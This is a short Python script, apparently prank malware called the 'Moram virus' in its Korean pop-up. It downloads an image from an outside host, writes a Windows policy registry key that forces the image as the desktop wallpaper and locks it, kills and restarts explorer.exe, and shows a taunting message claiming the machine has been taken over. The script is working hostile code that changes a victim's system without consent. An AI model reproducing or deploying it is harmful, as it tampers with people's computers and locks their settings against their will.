import os, requests, winreg, tkinter.messagebox
from tkinter import *



url = 'http://ryu.homes:8880/?password=morami-saiko'
save_path = 'C:\super-morami\moram-moram.png'

def disable_wallpaper_change():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, "C:\super-morami\moram-moram.png")
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "4")  # 10: Fill

if not os.path.isdir('C:\super-morami'):
    os.mkdir('C:\super-morami')

response = requests.get(url)

with open(save_path, 'wb') as f:
    f.write(response.content)
disable_wallpaper_change()
os.system('taskkill /f /im explorer.exe')
os.system('start explorer.exe')

tkinter.messagebox.showerror('모람이 바이러스', '큭큭 여긴 이제부터 내가 점령함 ㅅㄱ')
